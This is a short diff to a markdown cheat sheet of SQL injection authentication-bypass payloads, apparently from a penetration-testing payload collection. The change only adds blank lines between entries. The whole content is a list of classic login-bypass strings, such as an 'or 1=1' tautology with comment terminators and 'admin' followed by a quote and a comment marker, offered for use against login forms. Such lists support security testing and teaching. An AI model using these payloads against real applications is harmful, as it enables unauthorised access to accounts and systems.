@@ -1,9 +1,13 @@
 # SQL Injection Authentication-Bypass (Cheat Sheet)
 
 ``` or 1=1 ```
+
 ``` or 1=1-- ``` 
+
 ``` or 1=1# ```
+
 ``` or 1=1/* ```
+
 ``` admin' -- ``` 
 ``` admin' # ``` 
 ``` admin'/* ``` 
